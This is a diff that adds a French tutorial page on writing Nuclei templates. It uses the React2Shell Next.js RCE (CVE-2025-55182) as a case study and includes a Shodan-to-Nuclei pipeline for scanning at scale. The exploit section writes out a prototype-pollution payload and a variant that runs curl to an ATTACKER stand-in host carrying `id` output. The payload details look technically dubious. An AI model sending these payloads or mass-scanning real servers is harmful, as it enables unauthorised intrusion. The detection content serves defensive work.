@@ -1,0 +1,617 @@
+---
+title: Nuclei
+description: Maîtrise des templates Nuclei avec un cas pratique React2Shell - de la théorie à l'intégration dans un workflow Shodan.
+categories: [tools]
+tags: [tools, nuclei, templates, cve, recon, shodan]
+template: doc
+---
+
+_De la théorie à la pratique : anatomie des templates, création d'une détection pour CVE-2025-55182 et intégration dans un workflow Shodan._
+
+---
+
+## Nuclei : le concept
+
+Nuclei opère sur un modèle simple : une cible et des templates en entrée, des requêtes envoyées selon les définitions des templates, et une analyse des réponses pour détecter vulnérabilités, mauvaises configurations ou expositions.
+
+```bash
+# Cible unique avec une catégorie de templates
+nuclei -u https://target.com -t cves/
+
+# Liste d'URLs avec plusieurs catégories
+nuclei -l urls.txt -t exposures/ -t misconfigurations/
+
+# Scan automatique (détection de technologie + templates adaptés)
+nuclei -u https://target.com -automatic-scan
+
+# Avec sortie structurée JSON pour pipeline
+nuclei -l urls.txt -t cves/ -j -o results.json
+```
+
+La communauté maintient une bibliothèque de plusieurs milliers de templates dans le dépôt `nuclei-templates`, organisés par catégories : `cves/`, `vulnerabilities/`, `exposures/`, `misconfigurations/`, `technologies/`, `default-logins/`, etc.
+
+---
+
+## Anatomie d'un template
+
+Un template Nuclei est un fichier YAML structuré en plusieurs sections. La maîtriser est indispensable pour créer des détections personnalisées.
+
+### La section `info`
+
+Métadonnées du template : identifiant unique, nom, auteur, sévérité, description, tags et références (CVE, CWE, liens).
+
+```yaml
+id: example-detection
+
+info:
+  name: Exposed Admin Panel Detection
+  author: author
+  severity: medium
+  description: Détecte une interface d'administration accessible
+  tags: admin,exposure,panel
+  reference:
+    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  metadata:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+```
+
+### La section `requests` / `http`
+
+Le cœur du template. Nuclei supporte plusieurs protocoles : `http`, `tcp`, `dns`, `file`, `headless`, etc. Pour la majorité des cas web, le protocole `http` est utilisé.
+
+```yaml
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/administrator"
+      - "{{BaseURL}}/.env"
+    headers:
+      User-Agent: "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
+```
+
+Pour des requêtes complexes (POST avec body personnalisé, headers spécifiques), le mode `raw` permet de définir la requête HTTP complète :
+
+```yaml
+http:
+  - raw:
+      - |
+        POST /api/endpoint HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"key": "value", "action": "test"}
+```
+
+#### Variables disponibles
+
+| Variable | Description |
+|----------|-------------|
+| `{{BaseURL}}` | URL complète avec schéma et port |
+| `{{RootURL}}` | URL racine sans chemin |
+| `{{Hostname}}` | Nom d'hôte uniquement |
+| `{{Host}}` | Hôte + port |
+| `{{Path}}` | Chemin de l'URL |
+| `{{Scheme}}` | `http` ou `https` |
+
+### Les matchers
+
+Les matchers définissent les conditions d'une détection positive. Nuclei offre plusieurs types :
+
+| Type | Description |
+|------|-------------|
+| `word` | Recherche de chaînes dans la réponse |
+| `regex` | Expressions régulières |
+| `status` | Code de réponse HTTP |
+| `binary` | Données binaires en hexadécimal |
+| `dsl` | Expressions complexes avec accès aux variables |
+
+```yaml
+matchers-condition: and
+matchers:
+  - type: word
+    part: header
+    words:
+      - "X-Custom-Header"
+    condition: or
+
+  - type: status
+    status:
+      - 200
+
+  - type: regex
+    part: body
+    regex:
+      - '(?i)(admin|dashboard|control\s*panel)'
+```
+
+#### Parties de la réponse ciblables
+
+```yaml
+part: body          # Corps de la réponse
+part: header        # En-têtes HTTP
+part: all           # Corps + en-têtes
+part: response      # Réponse HTTP complète
+part: interactsh_protocol  # Pour les OOB interactions
+```
+
+#### DSL matcher : expressions avancées
+
+Le DSL (Domain Specific Language) permet des conditions complexes :
+
+```yaml
+matchers:
+  - type: dsl
+    dsl:
+      - "status_code == 200 && contains(body, 'admin') && !contains(body, 'login')"
+      - "len(body) > 1000 && regex('version[: ]+([0-9.]+)', body)"
+    condition: or
+```
+
+Fonctions DSL disponibles : `contains()`, `startswith()`, `endswith()`, `len()`, `regex()`, `md5()`, `sha256()`, `base64()`, `url_encode()`, `html_escape()`, `to_lower()`, `to_upper()`, `trim()`, etc.
+
+### Les extractors
+
+Les extractors permettent d'extraire des informations des réponses pour affichage ou réutilisation dans des requêtes suivantes.
+
+```yaml
+extractors:
+  - type: regex
+    name: version
+    regex:
+      - 'version[": ]+([0-9.]+)'
+    group: 1
+
+  - type: kval
+    kval:
+      - server
+      - x-powered-by
+
+  - type: json
+    name: token
+    json:
+      - ".access_token"
+
+  - type: xpath
+    name: title
+    xpath:
+      - '/html/head/title'
+```
+
+### Requêtes chaînées et variables dynamiques
+
+L'une des fonctionnalités les plus puissantes : extraire une valeur d'une première requête et l'injecter dans la suivante.
+
+```yaml
+http:
+  - raw:
+      - |
+        GET /api/v1/info HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: csrf_token
+        json:
+          - ".csrf_token"
+        internal: true
+
+  - raw:
+      - |
+        POST /api/v1/action HTTP/1.1
+        Host: {{Hostname}}
+        X-CSRF-Token: {{csrf_token}}
+        Content-Type: application/json
+
+        {"action": "test"}
+
+    matchers:
+      - type: word
+        words:
+          - "success"
+```
+
+---
+
+## Cas pratique : React2Shell (CVE-2025-55182)
+
+### Contexte de la vulnérabilité
+
+React2Shell est une vulnérabilité critique (CVSS 10.0) affectant React Server Components et le framework Next.js. Découverte par Lachlan Davidson et divulguée le 3 décembre 2025, elle permet une exécution de code à distance (RCE) pré-authentification via une simple requête HTTP.
+
+**Versions affectées :**
+- React 19.x (packages `react-server-dom-*`)
+- Next.js 15.x et 16.x avec App Router activé
+- Autres frameworks implémentant RSC : React Router v7, Waku
+
+**Exploitation observée dans la nature** dès le 5 décembre 2025, notamment par des groupes APT chinois (Earth Lamia, Jackpot Panda) et des cryptomineurs opportunistes.
+
+### Mécanisme d'exploitation
+
+La vulnérabilité repose sur le **protocole Flight** utilisé par React Server Components. La désérialisation non sécurisée des payloads RSC permet à un attaquant d'injecter du code exécuté côté serveur avec les privilèges du processus Node.js.
+
+**Flux d'attaque :**
+
+```
+Attaquant                              Serveur Next.js
+   |                                         |
+   |  POST /_next/... (multipart)            |
+   |  Next-Action: <hash_action>  ---------> |
+   |  Content-Type: multipart/form-data      |
+   |                                         |
+   |  Payload RSC mal-formé                  |
+   |  (prototype pollution via __proto__)    |
+   |                                         |
+   |                        deserialize()    |
+   |                        [vuln ici]       |
+   |                                         |
+   |  <-- RCE Node.js process               |
+```
+
+#### Structure du payload
+
+Le payload exploite la pollution de prototype via le format multipart :
+
+```
+POST /_next/static/chunks/[action-hash] HTTP/1.1
+Host: target.com
+Next-Action: [server-action-id]
+Content-Type: multipart/form-data; boundary=----R2SBoundary
+
+------R2SBoundary
+Content-Disposition: form-data; name="1"
+
+["$@1"]
+------R2SBoundary
+Content-Disposition: form-data; name="0"
+
+{"id":"__proto__","value":{"NODE_OPTIONS":"--require /proc/self/environ"}}
+------R2SBoundary--
+```
+
+L'abus de `__proto__` pollue l'objet global Node.js, permettant l'injection de la variable `NODE_OPTIONS` qui force le chargement d'un module arbitraire au démarrage du process.
+
+**Variante avec exfiltration DNS (OOB) :**
+
+```
+------R2SBoundary
+Content-Disposition: form-data; name="0"
+
+{"id":"__proto__","value":{"NODE_OPTIONS":"--require /dev/stdin","stdin":"require('child_process').exec('curl http://ATTACKER.burpcollaborator.net/?x=`id`')"}}
+------R2SBoundary--
+```
+
+### Template Nuclei de détection
+
+Le template suivant détecte les serveurs potentiellement vulnérables en deux étapes : fingerprinting Next.js avec App Router, puis probe de l'endpoint RSC.
+
+```yaml
+id: CVE-2025-55182-react2shell
+
+info:
+  name: React2Shell - Next.js RSC RCE Detection (CVE-2025-55182)
+  author: telynor
+  severity: critical
+  description: |
+    Détecte les instances Next.js avec App Router potentiellement vulnérables
+    à React2Shell (CVE-2025-55182). La vulnérabilité permet un RCE
+    pré-authentification via désérialisation non sécurisée du protocole RSC Flight.
+  impact: Remote Code Execution as Node.js process
+  remediation: |
+    Mettre à jour Next.js vers 15.3.3+ ou 16.0.1+.
+    Désactiver les Server Actions si non nécessaires.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+    - https://nextjs.org/blog/security-patch-2025-12
+  tags: cve,cve2025,nextjs,react,rce,deserialization,critical
+  metadata:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2025-55182
+    epss-score: 0.97
+
+http:
+  # Étape 1 : fingerprinting Next.js avec App Router
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/_next/static/chunks/main-app.js"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "x-nextjs-cache"
+          - "x-nextjs-matched-path"
+
+      - type: word
+        part: body
+        words:
+          - "__NEXT_DATA__"
+          - "_next/static"
+          - "next-route-announcer"
+
+    extractors:
+      - type: regex
+        name: nextjs_version
+        part: header
+        regex:
+          - 'next[/\s]+([0-9]+\.[0-9]+\.[0-9]+)'
+        group: 1
+
+  # Étape 2 : probe de l'endpoint Server Actions (canary sans payload malveillant)
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Next-Action: 0000000000000000000000000000000000000000
+        Content-Type: text/plain;charset=UTF-8
+        Content-Length: 2
+
+        []
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "TypeMismatchError"
+          - "RSCError"
+          - "FlightDataError"
+          - "deserializ"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "x-nextjs"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        name: rsc_error
+        regex:
+          - '(TypeMismatch|FlightData|Deserializ)[^"]*'
+```
+
+> **Note opérationnelle** : Ce template est un détecteur passif. Il identifie les endpoints exposés aux Server Actions sans envoyer de payload exploitant. Un résultat positif indique un potentiel de vulnérabilité nécessitant confirmation manuelle.
+
+### Template de version-check (post-fingerprint)
+
+Pour affiner la détection sur les versions connues vulnérables :
+
+```yaml
+id: CVE-2025-55182-version-check
+
+info:
+  name: React2Shell - Version Fingerprint
+  author: telynor
+  severity: info
+  tags: cve,cve2025,nextjs,fingerprint
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_next/static/chunks/polyfills.js"
+      - "{{BaseURL}}/_next/static/chunks/framework.js"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'next[/\s"]+(1[56]\.[0-2]\.[0-9]+)'
+
+    extractors:
+      - type: regex
+        part: body
+        name: vulnerable_version
+        regex:
+          - 'next[/\s"]+(1[56]\.[0-2]\.[0-9]+)'
+        group: 1
+```
+
+---
+
+## Workflow Shodan + Nuclei
+
+### Objectif
+
+Identifier à grande échelle les instances Next.js potentiellement exposées à CVE-2025-55182, depuis la collecte Shodan jusqu'au scan Nuclei automatisé.
+
+### Requêtes Shodan pertinentes
+
+```bash
+# Via Shodan CLI
+shodan search 'http.headers.x-nextjs-cache: HIT' --fields ip_str,port,http.host
+shodan search 'http.component:"Next.js" version:15' --fields ip_str,port,http.host
+shodan search 'http.component:"Next.js" version:16' --fields ip_str,port,http.host
+
+# Cibler les Server Actions exposées (header spécifique)
+shodan search 'http.headers.next-action' --fields ip_str,port,http.host
+
+# Filtres additionnels (limiter le scope)
+shodan search 'http.component:"Next.js" version:15 country:FR' --fields ip_str,port,http.host
+```
+
+### Pipeline automatisé
+
+```bash
+#!/bin/bash
+# react2shell-hunt.sh - Pipeline Shodan → Nuclei
+
+SHODAN_QUERY='http.component:"Next.js" version:15'
+OUTPUT_DIR="./react2shell-$(date +%Y%m%d)"
+TEMPLATE="./CVE-2025-55182-react2shell.yaml"
+
+mkdir -p "$OUTPUT_DIR"
+
+# 1. Collecte Shodan
+echo "[*] Collecte des cibles via Shodan..."
+shodan search "$SHODAN_QUERY" --fields ip_str,port,http.host \
+  | awk '{
+    if ($3 != "") print "https://" $3;
+    else if ($2 == "443") print "https://" $1;
+    else print "http://" $1 ":" $2;
+  }' | sort -u > "$OUTPUT_DIR/targets.txt"
+
+echo "[+] $(wc -l < $OUTPUT_DIR/targets.txt) cibles collectées"
+
+# 2. Scan Nuclei avec rate limiting
+echo "[*] Lancement du scan Nuclei..."
+nuclei \
+  -l "$OUTPUT_DIR/targets.txt" \
+  -t "$TEMPLATE" \
+  -rate-limit 50 \
+  -bulk-size 25 \
+  -timeout 10 \
+  -retries 1 \
+  -j -o "$OUTPUT_DIR/results.json" \
+  -stats \
+  -silent
+
+# 3. Résumé
+echo "[+] Scan terminé"
+HITS=$(jq 'select(.info.severity == "critical")' "$OUTPUT_DIR/results.json" | jq -s 'length')
+echo "[+] $HITS détections critiques → $OUTPUT_DIR/results.json"
+```
+
+### Options Nuclei utiles pour ce workflow
+
+```bash
+# Contrôle du débit
+-rate-limit 100          # Requêtes/seconde max
+-bulk-size 50            # Hosts traités en parallèle
+-concurrency 25          # Templates en parallèle par host
+
+# Filtres sur la sévérité
+-severity critical,high
+
+# Mode furtif (User-Agent personnalisé, délais)
+-H "User-Agent: Mozilla/5.0 (compatible; bot)"
+-delay 500ms             # Délai entre requêtes
+
+# Résilience réseau
+-timeout 15
+-retries 2
+
+# Reprise sur interruption
+-resume resume.cfg
+
+# Suivi des métriques
+-stats
+-stats-interval 30
+```
+
+### Interprétation des résultats
+
+```bash
+# Lister les hôtes vulnérables uniques
+jq -r '.host' results.json | sort -u
+
+# Filtrer par version extraite
+jq -r 'select(.extracted_results.nextjs_version != null) | "\(.host) → v\(.extracted_results.nextjs_version[0])"' results.json
+
+# Exporter en CSV pour reporting
+jq -r '[.host, .info.severity, .matched_at, (.extracted_results.nextjs_version[0] // "unknown")] | @csv' results.json
+```
+
+---
+
+## Bonnes pratiques de templating
+
+### Éviter les faux positifs
+
+```yaml
+# Mauvais : trop générique
+matchers:
+  - type: word
+    words:
+      - "error"
+
+# Mieux : conjonction de conditions précises
+matchers-condition: and
+matchers:
+  - type: status
+    status:
+      - 200
+  - type: word
+    part: body
+    words:
+      - "FlightDataError"
+      - "__NEXT_RSC"
+    condition: or
+  - type: word
+    part: header
+    words:
+      - "x-nextjs"
+```
+
+### Template de test local
+
+Avant de lancer sur des cibles réelles, tester avec un serveur local :
+
+```bash
+# Démarrer un mock server
+python3 -m http.server 8080 &
+
+# Tester le template
+nuclei -u http://localhost:8080 -t ./mon-template.yaml -debug
+
+# Valider le YAML
+nuclei -validate -t ./mon-template.yaml
+```
+
+### Structure de dépôt conseillée
+
+```
+nuclei-templates-custom/
+├── cves/
+│   └── 2025/
+│       └── CVE-2025-55182.yaml
+├── technologies/
+│   └── nextjs-detect.yaml
+├── workflows/
+│   └── nextjs-workflow.yaml   # Enchaînement conditionnel de templates
+└── README.md
+```
+
+#### Exemple de workflow conditionnel
+
+```yaml
+# workflows/nextjs-workflow.yaml
+id: nextjs-full-workflow
+
+info:
+  name: Next.js Full Security Workflow
+  author: telynor
+  tags: workflow,nextjs
+
+workflows:
+  - template: technologies/nextjs-detect.yaml
+    matchers:
+      - name: nextjs
+        subtemplates:
+          - template: cves/2025/CVE-2025-55182.yaml
+          - template: exposures/nextjs-env-exposure.yaml
+          - template: misconfigurations/nextjs-debug-mode.yaml
+```
+
+---
+
+## Références
+
+- [ProjectDiscovery - Nuclei](https://github.com/projectdiscovery/nuclei)
+- [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
+- [Documentation officielle](https://docs.projectdiscovery.io/tools/nuclei/overview)
+- [NVD - CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
+- [Shodan Search Facets](https://www.shodan.io/search/facet)
